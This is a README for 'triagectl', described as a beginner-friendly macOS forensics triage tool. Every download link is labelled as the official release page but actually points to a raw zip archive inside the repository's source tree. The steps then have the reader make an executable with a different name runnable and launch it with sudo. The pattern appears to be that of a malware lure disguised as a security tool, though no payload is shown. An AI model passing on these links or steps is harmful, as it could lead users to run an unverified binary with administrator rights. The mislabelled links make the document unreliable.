# 🛠️ triagectl - Fast MacOS Forensics Triage Tool

[![Download triagectl](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)

---

## 📋 What is triagectl?

triagectl is a simple tool for macOS users who want to check their computer for signs of digital threats or incidents. It gathers important information about your system quickly and saves this data in different formats you can easily review or share with forensic experts.

The tool works as a single file you run on your Mac. It doesn't need any extra programs or complicated setup. You can use it without deep technical knowledge.

---

## 🔍 Features You Should Know

- Gathers info from **26 different system areas** like user activity, network connections, security settings, and persistence methods.
- Performs basic **automatic checks** to find suspicious processes, unusual network activity, and suspicious startup items.
- Matches your system data against known bad indicators like IP addresses, domain names, file hashes, and file paths.
- Outputs results in easy-to-use formats: database file (SQLite), spreadsheet (CSV), interactive web report (HTML), and timeline format for advanced analysis.
- Runs collectors at the same time, making the whole process faster.
- Works with or without administrator rights, showing more information if you run it with special permissions.

---

## 🚀 Getting Started

triagectl is designed to be easy to use. Follow these steps to download, set up, and run it on your Mac.

---

## 📥 Download & Install

Click the big link below to visit the official release page for triagectl. On this page, you will find the latest version of the tool ready to download:

[Download triagectl from GitHub Releases](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)

Here is how to get triagectl on your Mac:

1. Visit the link above. This page lists the latest available versions.
2. Find the file named something like `triagectl_darwin_amd64` (or similar name depending on your Mac). This is the program file.
3. Download the file to your Downloads folder or a place you will remember.
4. Open the Terminal app on your Mac. You can find it in Applications > Utilities > Terminal.
5. Use the `cd` command to go to the folder where you downloaded triagectl. For example, type:

   ```
   cd ~/Downloads
   ```
6. Make the file usable by typing:

   ```
   chmod +x triagectl_darwin_amd64
   ```
7. You are now ready to run triagectl.

---

## ▶️ How to Run triagectl

Once you have downloaded and made triagectl executable, follow these steps to run it:

1. Open Terminal and go to the folder with triagectl:

   ```
   cd ~/Downloads
   ```
2. Run the program by typing:

   ```
   ./triagectl_darwin_amd64
   ```

This runs all system checks and saves the results into files.

You can also ask triagectl to create a friendly HTML report or a timeline file by adding options:

```
./triagectl_darwin_amd64 --html --timeline
```

---

## 🧰 What triagectl Collects

triagectl scans many places on your Mac to give you a broad view of system health and risks. Here are some examples:

- **Persistence**: Looks for programs that run when your Mac starts.
- **User Activity**: Checks logs of what users have done recently.
- **Network**: Looks at active connections and recent network history.
- **Security**: Gathers data about security settings and known issues.
- **Suspicious Processes**: Finds unusual or unknown running programs.
- **IOC Matching**: Compares your data to a list of known bad items (IPs, domains, hashes).

The tool collects data quickly and safely, without changing your system.

---

## 📁 Output Files Explained

After running triagectl, you will find several files in the folder. Here’s how to understand them:

- **SQLite file (.sqlite)**: A database storing all collected information. You can open it with database viewers or forensic tools.
- **CSV files (.csv)**: Simple spreadsheet files you can open in Excel or similar programs.
- **HTML report (.html)**: An interactive webpage showing results in groups, easy to browse.
- **Timesketch timeline (.jsonl)**: A file that integrates with a digital forensics timeline tool for deeper investigation.

---

## ⚙️ Using Advanced Options

triagectl has several options you can add when running to control how it works:

- `--html` – generates the interactive HTML report.
- `--timeline` – creates the Timesketch timeline file.
- `--ioc` – uses a custom indicator file to match against system data.
- `--timeout` – sets how long each collector is allowed to run.
- `--parallelism` – controls how many collectors run at the same time.
- `sudo` – run triagectl as an administrator to collect more data.

Example usage with options:

```
sudo ./triagectl_darwin_amd64 --html --timeline
```

---

## 🔐 Running with Administrator Rights

Some data on your Mac can only be accessed by a user with administrator rights. To see this extra data, open Terminal and run triagectl with `sudo`:

```
sudo ./triagectl_darwin_amd64
```

You might need to enter your password. This allows triagectl to gather more detailed information for better analysis.

---

## 🧑‍💻 Troubleshooting Tips

- If you get a "Permission denied" error, make sure you have made the triagectl file executable (`chmod +x`).
- If the program won't run, check that you are in the folder where triagectl is located.
- Running without `sudo` limits the information collected. Try running with `sudo` if you want full results.
- If you are unsure about options, run:

  ```
  ./triagectl_darwin_amd64 --help
  ```

- Make sure your macOS version is 10.12 or higher for best compatibility.

---

## ℹ️ System Requirements

- A Mac running macOS 10.12 Sierra or later.
- At least 2 GB of free disk space for output files.
- Terminal app access (included on all Macs).
- Administrator password if you want full data collection.

---

## 🌐 Useful Links

- Official release page for downloads: [https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)
- Project home page and documentation: visit the GitHub page above.
- If you need help, check the Issues tab on the GitHub repo or reach out to the community.

---

## 📥 Download triagectl now

[![Download triagectl](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)